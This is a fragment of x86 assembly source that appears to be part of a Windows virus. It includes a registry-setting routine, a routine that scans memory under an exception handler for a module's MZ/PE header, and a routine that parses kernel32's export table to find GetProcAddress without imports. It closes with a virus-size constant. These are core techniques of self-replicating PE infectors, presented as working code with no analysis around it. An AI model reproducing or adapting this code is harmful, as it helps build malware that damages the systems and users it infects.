           db      "RegCloseKey",0
   @@GL4:
           Push    @@hAdv
           Call    @@GetProcAdd

           push    dword ptr [@@hKey]
           call    Ecx
   ;Murk1
   ;        push    255d
   ;        call    @@strBuf
   ;        db      255d dup(0)
   ;@@strBuf:

   @@uups:
           ret

   ;=====================================
   @@GetProcAdd PROC   WINDOWS
   ;accepts the procname and the handle of a dll
   ;returns in ecx the address of the api
   ARG     @@hAdv:DWORD,@@ProcName:Dword

           push    @@ProcName
           push    @@hAdv
           call    fs:[14h]
           xchg    eax,ecx
           ret
   @@GetProcAdd EndP

   SetReg  EndP
   ;=====================================
   ;-------------------------------------
   ;GetMZ subroutine
   ;Passed
   ;EAX = the address we want to start looking for
   ;Returns the MZ header location above this
   ;RETURNS IN EAX THE LOCATION OF THE MZ header
   ;Should be the Load VA for the program
   GetMZ   Proc
       Pusha
       mov ebp, esp

           ;Set up a SEH handler
   @@GetMZ_SetSeh:
       call    $ + 5
           add     dword ptr [esp], Offset @@GetMZ_FindExcept  - $
       Push    dword ptr fs:[0]
       mov fs: [0] , esp

           ;set Esi = eax
       Xchg    esi, eax

   @@GetMZ_LoopFind:
           ;this checks for the MZ and the PE if both are not found
           ;but MZ is we assume an error and exit out
           ;with esi = 0
       and esi,0FFFFF000h
       Pusha
       Lodsw
       Cmp ax,'ZM'
           Jne     @@GetMZ_NotFound
       Add esi, [esi + 3Ah]
       dec esi
       dec esi

       lodsw
       cmp ax,'EP'
           je      @@GetMZ_Found

       xor eax,eax
           mov     dword ptr [esp + 04h],eax
           jmp     @@GetMZ_Found   ;Not really assume error and return with esi
                               ; = 0

   @@GetMZ_NotFound:
           popa
       sub esi,1000h
           jmp     @@GetMZ_LoopFind

   @@GetMZ_FindExcept:
       mov eax, [esp + 08h]
       Lea esp, [eax - 20h]
       popa
       pop dword ptr fs:[0]
       inc esp         ;esp + 4
       inc esp
       inc esp
       inc esp
       sub esi,1000h
           Jmp     @@GetMZ_SetSeh

   @@GetMZ_Found:
       Popa            ;esi = the MZ header

           ;restore the the orginal SEH
       Pop dword ptr fs:[0]
       Add esp, 4

           ; Set our Eax to be the return Value
       Mov dword ptr [ebp + 1ch],esi
       Popa

           Ret

   GetMZ   EndP
   ;---------------------------

   ;==============================================================================
   ;Takes EAX = K32 VA
   ;Returns
   ;eax = K32 address or 0 if failure
   ;fs:[14] = GetProcessAddress if Succcess

   GetAPI  PROC WINDOWS PASCAL

   ;LOCAL   @@gaWorkSp:dword,@@gaGetPAdd:dword,@@gaNindex:dword,@@gaAddOrd:dword,@@gaAddName:dword,@@gaAddFunc:dword,@@gaLimit:dword,@@gaBASE:dword,@@gaK32:dword

   LOCAL   @@gaWorkSp:dword
   LOCAL   @@gaGetPAdd:dword
   LOCAL   @@gaNindex:dword
   LOCAL   @@gaAddOrd:dword
   LOCAL   @@gaAddName:dword
   LOCAL   @@gaAddFunc:dword
   LOCAL   @@gaLimit:dword
   LOCAL   @@gaBASE:dword
   LOCAL   @@gaK32:dword

       pusha           ;Save everthing
       Mov Ebx,dword ptr[Eax + 3ch]
       add Ebx,eax     ;get PE location

           mov     [@@gaBASE],eax              ;save VA
       push    eax

           mov     [@@gaK32],ebx         ;save PE location
       mov Eax,[Ebx + 78h]           ;Edata Loc

       pop ebx
       lea Esi,[Eax + Ebx + 10h]     ;should be the Base of the Edata
           Lea     Edi,[@@gaBASE]        ;Starting pnt for the ordinal
                           ;exported by this DLL
       ;now that Esi and Edi point to the correct loactions
       ;we can just lodsd instead of Mov eax,[]
       ;then stosd instead of mov [],eax
       Lodsd                             ;save base
       stosd
       Lodsd                           ;Load the Total
                       ;number of Exports but trash

       lodsd                           ;get and save the Limit
       stosd                           ;this is the number of both
       ;named and unamed functions Eported

       Lodsd                           ;get and save the address to
       add eax,ebx                 ;the function's
       stosd

       Lodsd                           ;get and save the address to
       add eax,ebx                 ;the names of the function
       stosd

       Lodsd                           ;get and save the address to
       add eax,ebx                 ;the ordinals of the function
       stosd

   gaLookLoop:

           Mov     Esi,[@@gaAddName]  ;first adrress of the first name
           Mov     [@@gaNindex],Esi   ;store where we are

       Mov     Edi,Ebx                ;get the load Add of K32
       Add Edi, [Esi]
       xor     Ecx,Ecx
   gaTryAgain:
   ;find GetProcAddress
       cmp [Edi],'PteG'
       jne gaNextOne

       cmp [Edi+4],'Acor'
       jne gaNextOne

       cmp [Edi+8],'erdd'
       jne gaNextOne

       cmp word ptr[Edi+0Ch],'ss'
       jne gaNextOne

       cmp byte ptr [Edi+0Eh],00
       jne gaNextOne

       jmp gaGotGetProcAdd

   gaNextOne:

       inc Ecx
           cmp     Ecx, [@@gaLimit]
       jge gaNotFound1

           add     dword ptr [@@gaNindex],4
           Mov     Esi, [@@gaNindex]
       Mov Edi, [Esi]
       Add Edi, Ebx
       jmp gaTryAgain
   gaGotGetProcAdd:

   ;ok we have the index into the name array use this to get
   ; the index into the ord array

       shl Ecx,1           ;*2 for a word array
           Mov     Esi, [@@gaAddOrd]
       add Esi,Ecx         ;move to the correct spot in the array

       Movzx   Eax,word ptr [Esi]
       ;ax = ordinal value

       shl Eax,2           ;*4
           Mov     Esi, [@@gaAddFunc]
       Add Esi, Eax

       Mov Edi, dword ptr [Esi]
       add Edi,ebx                 ;got the address of it

       xchg    Eax, Edi
           Mov     dword ptr [@@gaGetPAdd],eax
       jmp gaOkFound

   gaNotFound1:

       xor Eax,Eax                   ;damn not found
                             ;set the eax to 0

   gaOkFound:
       Mov fs:[14h],Eax              ;add the VA to it

       or  Eax,Eax
       jnz gaOK
       Mov [Esp + 1ch],Eax           ;set Eax to zero for Popa

   gaOK:
       popa

       Ret
   ENDP
   ;------------------------------


   VSize   equ     $ - offset PEheader

   fBuff   db      400h Dup(?)



            end     Begin
